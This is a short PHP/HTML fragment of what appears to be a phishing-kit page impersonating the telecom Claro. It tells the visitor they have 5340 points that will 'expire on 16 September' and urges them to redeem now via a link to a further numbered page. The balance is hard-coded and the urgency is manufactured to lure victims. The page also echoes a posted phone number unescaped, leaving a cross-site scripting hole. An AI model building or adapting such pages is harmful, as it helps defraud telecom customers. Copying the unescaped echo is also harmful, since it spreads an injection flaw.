...
<?php //include 'header-banner1.php'; 
?>
<style>
    .text-satura {
        font-weight: 700;
...
<h2 class="title text-satura title-turqoise">Recordatorio de puntos</h2>
<div class="content">
    ...
    <h2 class="text-satura txt-center t-b-12 subtitle_ac"><font color="red">Claro Miembro:</font>   <?php echo $_POST['phoneNo']?></h2>
    <h2 class="text-satura txt-center t-b-12 subtitle_ac">Puntos disponibles: 5340</h2>
    <p>
        Tus puntos acumulados caducarán el 16 de septiembre y se borrarán, ¡canjea tu regalo cuanto antes!
    </p>
    <a href="/page6.php" onclick="$('a.nxm-cls-c-1').trigger('click')" class="but but--primary has-hover-icon text-satura text-truncate step_btn ">Canjear ahora</a>
</div>
</div>
